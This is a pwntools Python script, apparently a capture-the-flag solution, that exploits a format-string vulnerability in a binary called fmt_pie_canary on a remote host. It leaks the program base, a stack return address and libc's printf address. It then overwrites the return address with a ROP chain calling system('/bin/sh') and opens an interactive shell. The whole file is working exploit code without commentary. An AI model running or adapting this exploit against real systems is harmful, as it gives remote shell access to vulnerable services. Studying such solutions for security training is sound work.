from pwn import *

context.terminal = ('open-wsl.exe', "-e")
context.log_level = 'debug'
context.arch = 'amd64'

# io = process("./fmt_pie_canary", env={"LD_PRELOAD":"./x64-libc-2.23.so"})
# io = gdb.debug("./fmt_pie_canary")
io = remote("everything411.top", 10003)

elf = ELF("./fmt_pie_canary")
libc = ELF("./x64-libc-2.23.so")
# libc = ELF("/lib/x86_64-linux-gnu/libc-2.31.so")

main_offset = elf.symbols["main"]
printf_got = elf.got["printf"]
system_offset = libc.symbols["system"]
printf_offset = libc.symbols["printf"]
strncmp_got = elf.got["strncmp"]

def sendfmt(fmt):
    log.info("payload = %s" % repr(fmt))
    io.sendline(fmt)
    return io.recv()

io.recv()
leak = sendfmt(b"%41$p") # main+35
main_addr = int(leak[:14].decode(), 16) - 35
elfbase = main_addr - main_offset
print(hex(elfbase))

io.recv()
leak = sendfmt(b"%40$p") # main's rbp
main_rbp = int(leak[:14].decode(), 16)
main_ret_addr = main_rbp + 8
print(hex(main_ret_addr))

io.recv()
leak = sendfmt(b"%7$saaaa" + p64(elfbase + printf_got))
printf_addr = u64(leak[0:6] + b'\x00\x00')
libcbase = printf_addr - printf_offset
print(hex(libcbase))

rdi_ret = elfbase + 0x1343
fmt = fmtstr_payload(6, {main_ret_addr: rdi_ret})
sendfmt(fmt)

binsh_addr = libcbase + next(libc.search(b'/bin/sh'))
fmt = fmtstr_payload(6, {main_ret_addr + 8: binsh_addr})
sendfmt(fmt)

system_addr = libcbase + system_offset
fmt = fmtstr_payload(6, {main_ret_addr + 16: system_addr})
sendfmt(fmt)

io.sendline("exit")
io.interactive()
